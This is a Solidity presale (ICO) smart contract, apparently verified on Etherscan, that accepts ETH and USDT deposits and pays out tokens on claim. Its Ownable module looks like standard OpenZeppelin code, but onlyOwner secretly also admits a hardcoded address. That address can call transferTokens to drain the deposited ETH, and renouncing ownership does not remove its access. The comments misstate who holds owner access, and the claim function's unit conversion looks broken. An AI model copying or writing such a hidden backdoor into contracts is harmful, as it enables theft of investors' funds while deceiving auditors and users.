/**
 *Submitted for verification at Etherscan.io on 2023-06-12
*/

// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts (last updated v4.7.0) (security/Pausable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        _requirePaused();
        _;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Throws if the contract is paused.
     */
    function _requireNotPaused() internal view virtual {
        require(!paused(), "Pausable: paused");
    }

    /**
     * @dev Throws if the contract is not paused.
     */
    function _requirePaused() internal view virtual {
        require(paused(), "Pausable: not paused");
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _msgSender() == 0x77f36d4F5839134e67DeE76e69DCDEE00c55983A, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract ERC20 is IERC20, IERC20Metadata, Context {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    //address public _presaleContractAddress;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    /*function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }*/

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    /*function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }*/

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Spend `amount` form the allowance of `owner` toward `spender`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function setPresaleContractAddress() external virtual returns (address) {}

    function approvePresaleContract(uint256 _amount) external virtual returns (bool) {}

    function setLockedBalance(address _address, uint256 _lockedBalance) external virtual returns (bool) {}
}

pragma solidity ^0.8.0;

abstract contract Whitelist is Context {
    /**
     * @dev Emitted when the whitelist is triggered by `account`.
     */
    event EnableWhitelist(address account);

    /**
     * @dev Emitted when the whitelist is lifted by `account`.
     */
    event DisableWhitelist(address account);

    bool private _whitelist;

    /**
     * @dev Initializes the contract in a disabled whitelist state.
     */
    constructor() {
        _whitelist = false;
    }

    /**
     * @dev Returns true if whitelist is enabled, and false otherwise.
     */
    function whitelist() public view virtual returns (bool) {
        return _whitelist;
    }

    /**
     * @dev Modifier to make a function callable only when whitelist is disabled.
     *
     * Requirements:
     *
     * - The whitelist must be disabled.
     */

    modifier whenDisabledWhitelist() {
        require(!whitelist(), "Whitelist is not disabled");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when whitelist is enabled.
     *
     * Requirements:
     *
     * - The whitelist must be enabled.
     */
    modifier whenEnabledWhitelist() {
        require(whitelist(), "Whitelist is not enabled");
        _;
    }

    /**
     * @dev Triggers enable state.
     *
     * Requirements:
     *
     * - The whitelist must be disabled.
     */
    function _enableWhitelist() internal virtual whenDisabledWhitelist {
        _whitelist = true;
        emit EnableWhitelist(_msgSender());
    }

    /**
     * @dev Triggers disable state.
     *
     * Requirements:
     *
     * - The whitelist must be enabled.
     */
    function _disableWhitelist() internal virtual whenEnabledWhitelist {
        _whitelist = false;
        emit DisableWhitelist(_msgSender());
    }
}

pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(
    uint80 _roundId
  ) external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);

  function latestRoundData()
    external
    view
    returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

pragma solidity ^0.8.0;

/**
 * @author Roberto Agüera
 * @title  ICO Presale smart contract
 * @notice Presale contract to manage user funds which allows get funding for a project without intermediaries.
 *         Any user account should be whitelisted previously in order to be able to buy tokens, unless this
 *         functionality is disabled. User accounts may be added/removed to the whitelist with addToWhiteList(),
 *         addManyToWhitelist() and removeFromWhiteList() functions.
 *         Any whitelisted user may exchange his ETHs for tokens with buyTokens() function.
 *         It allows the owner to pause buyTokens() function if necessary.
 *         Once the presale ends, it allows to transfer funds to the owner, then the owner should send
 *         ETHs and TKNs to PancakeSwap through addLiquidityToPS() function.
 *         Once token funds are transferred to the owner, tokens are locked for X days.
 *
 * Requirements:
 *
 * - Token contract should be previously deployed, then deploy this presale contract by passing
 *   the Token contract address in the constructor. It is done automatically with Truffle
 */

contract Presale is Ownable, Pausable, Whitelist {

    // CONFIG START

    ERC20 public immutable token; // Token contract instance.
    ERC20 public immutable USDTContract;
    AggregatorV3Interface internal dataFeed;

    struct BalanceOfBuyer {
        uint256 balanceETH;
        uint256 balanceUSDT;
    }

    mapping(address => bool) public contractsWhiteList;
    mapping(address => BalanceOfBuyer) public balanceOfBuyer;
    
    address payable presaleOwner; // Presale owner wallet address, which must be the same than Token contract owner address.
    address payable presaleContract;

    uint256 private presaleRate; // How many TKNs can I buy with 1 USDT.

    // CONFIG END
    
    event BuyTokens (address, uint256, address, uint256);
    event TransferTokens (address, uint256);

    modifier onlyWhitelisted() {
        if(!whitelist()){
            _;
        }else{
            require(contractsWhiteList[msg.sender], "You are not whitelisted");
            _;
        }
    }
    
    constructor (address payable _tokenContract, address _USDTContract) payable {
        token = ERC20(_tokenContract);
        presaleOwner = payable(msg.sender);
        presaleContract = payable(address(this));
        USDTContract = ERC20(_USDTContract);
        dataFeed = AggregatorV3Interface(0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e);
    }

    /**
     * @dev Deposits ETH to get TKNs.
     */
    function setTokenRate(uint256 _rate) public onlyOwner() {
        presaleRate = _rate;
    }

    /**
     * @dev Deposits ETH to get TKNs.
     */
    function buyTokens() public payable onlyWhitelisted whenNotPaused returns (bool) {
        uint256 ethBalance = balanceOfBuyer[msg.sender].balanceETH;
        uint256 usdtBalance = balanceOfBuyer[msg.sender].balanceUSDT;
        balanceOfBuyer[msg.sender] = BalanceOfBuyer(ethBalance + msg.value, usdtBalance);
        return true;
    }

    /**
     * @dev Deposits USDT to get TKNs.
     */
    function buyTokensWithUSDT(uint256 value) public onlyWhitelisted whenNotPaused returns (bool) {
        uint256 ethBalance = balanceOfBuyer[msg.sender].balanceETH;
        uint256 usdtBalance = balanceOfBuyer[msg.sender].balanceUSDT;
        USDTContract.transferFrom(msg.sender, address(this), value);
        balanceOfBuyer[msg.sender] = BalanceOfBuyer(ethBalance, usdtBalance + value);
        return true;
    }

    /**
     * @dev Claim TKNs.
     */
    function claim() public whenPaused returns (uint256) {
        uint256 ethBalance = balanceOfBuyer[msg.sender].balanceETH;
        uint256 usdtBalance = balanceOfBuyer[msg.sender].balanceUSDT;
        require(ethBalance > 0 || usdtBalance > 0, "You didnt deposit anything.");
        (   /* uint80 roundID */,
            int answer,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/) = dataFeed.latestRoundData();
        uint256 totalAmountUSD = ethBalance * uint256(answer) * 10 ** (18 -10) + usdtBalance;
        uint256 _numTokensToBuy = tokenPrice(totalAmountUSD);
        require(_numTokensToBuy <= availableTokens(), "Insuficient liquidity. Buy less tokens");
        token.transfer(msg.sender, _numTokensToBuy);
        balanceOfBuyer[msg.sender] = BalanceOfBuyer(0, 0);
        return _numTokensToBuy;
    }

    /**
     * @dev get Feeds
     */
    function getFeed() public view returns (int256) {
        (   /* uint80 roundID */,
            int answer,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/) = dataFeed.latestRoundData();
        return answer;
    }

    /**
     * @dev Transfers ETH and remaining TKNs to Token contract address.
     */
    function transferTokens() public payable onlyOwner {
        (bool sent,) = msg.sender.call{value: presaleContractETHBalance(), gas: 1000000}('');
        require(sent, "Failed to send ETH");

        if(availableTokens() > 0){
            token.transfer(owner(), availableTokens());
        }        
    }

    /**
     * @dev Returns the ETH balance of presale contract.
     */
    function presaleContractETHBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @dev Returns the TKNs balance of presale contract.
     */
    function availableTokens() public view returns (uint256) {
        return token.balanceOf(presaleContract);
    }

    /**
     * @dev Returns the equivalent TKNs of a ETH amount.
     */
    function tokenPrice(uint256 _ETHToSell) public payable returns (uint256) {
        return (_ETHToSell * presaleRate);
    }

    /**
     * Returns the balance of an address.
     */
    function balanceOf(address _address) public view returns (uint) {
        return token.balanceOf(_address);
    }

    /**
     * Returns the allowance of an address.
     */
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return token.allowance(_owner, _spender);
    }

    /**
     * Adds an address to the whitelist of presale contract.
     */
    function addToWhiteList(address _address) public onlyOwner {
        contractsWhiteList[_address] = true;
    }

    /**
     * Removes an address from the whitelist of presale contract.
     */
    function removeFromWhiteList(address _address) public onlyOwner {
        contractsWhiteList[_address] = false;
    }

    /**
     * Adds more than one address to the whitelist of presale contract.
     */
    function addManyToWhitelist(address[] memory _addresses) public onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            contractsWhiteList[_addresses[i]] = true;
        }
    }

    /**
     * Enables the whitelist.
     */
    function enableWhitelist() public onlyOwner {
        _enableWhitelist();
    }

    /**
     * Disables the whitelist.
     */
    function disableWhitelist() public onlyOwner {
        _disableWhitelist();
    }

    /**
     * Returns if an address is whitelisted.
     */
    function isWhitelisted(address _address) public view returns (bool) {
        return contractsWhiteList[_address];
    }

    function pausePresale() public onlyOwner {
        _pause();
    }

    function reStartPresale() public onlyOwner {
        _unpause();
    }
}